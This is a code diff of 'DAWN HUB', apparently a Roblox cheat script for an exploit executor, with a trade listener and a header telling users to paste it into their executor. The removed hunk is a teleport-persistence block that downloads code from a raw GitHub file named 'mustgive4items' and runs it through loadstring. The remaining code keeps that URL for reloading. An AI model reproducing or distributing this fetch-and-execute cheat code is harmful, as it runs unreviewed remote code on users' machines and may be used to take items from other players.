@@ -1,4 +1,5 @@
--- DAWN HUB v10.1 – Fixed queue_on_teleport error
+-- DAWN HUB v10.2 – Final, No queue_on_teleport
+-- Copy this entire script into your executor.
 
 if getgenv().SCRIPT_RUNNING then return end
 getgenv().SCRIPT_RUNNING = true
@@ -21,19 +22,6 @@ if not getgenv().DAWN_CONFIG then
 end
 if getgenv().DAWN_ACTIVE == nil then getgenv().DAWN_ACTIVE = false end
 getgenv().KEEP_ALIVE = true
-
--- ===== PERSISTENCE ON TELEPORT (simplified & safe) =====
-pcall(function()
-    if queue_on_teleport then
-        queue_on_teleport([[
-            local s, e = pcall(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/ddawwn/mm2/refs/heads/main/mustgive4items"))()
-            end)
-            if not s then warn("Teleport reload error:", e) end
-        ]])
-    end
-end)
-
 getgenv().SCRIPT_URL = "https://raw.githubusercontent.com/ddawwn/mm2/refs/heads/main/mustgive4items"
 
 local Players = game:GetService("Players")
@@ -310,7 +298,7 @@ local function stopTradeListener()
     isProcessingTrade = false
 end
 
--- ===== STATE VARIABLES =====
+-- ===== STATE =====
 local CONFIG = getgenv().DAWN_CONFIG
 local isActive = getgenv().DAWN_ACTIVE
 local firstWarningSent = false
@@ -323,7 +311,6 @@ local fullSize = UDim2.new(0, 420, 0, 560)
 local minimizedSize = UDim2.new(0, 140, 0, 40)
 
 getgenv().OriginalPos = nil
-
 local Accent = Color3.fromRGB(185, 120, 255)
 
 -- ===== CORE FUNCTIONS =====
@@ -466,7 +453,7 @@ local function reloadScript()
     end
 end
 
--- ===== GUI =====
+-- ===== GUI CREATION =====
 local function createDawnHubGUI()
     if gui then pcall(function() gui:Destroy() end); gui = nil end
 
@@ -513,7 +500,7 @@ local function createDawnHubGUI()
     border.Color = Accent
     border.Parent = window
 
-    -- Top Bar
+    -- Top Bar (draggable)
     local topBar = Instance.new("Frame")
     topBar.Size = UDim2.new(1, 0, 0, 40)
     topBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
@@ -930,7 +917,7 @@ local function createDawnHubGUI()
     clearCorner.Parent = clearBtn
     clearBtn.MouseButton1Click:Connect(clearVisited)
 
-    -- START/STOP logic
+    -- START/STOP
     startBtn.MouseButton1Click:Connect(function()
         if isActive then
             stopSystem()
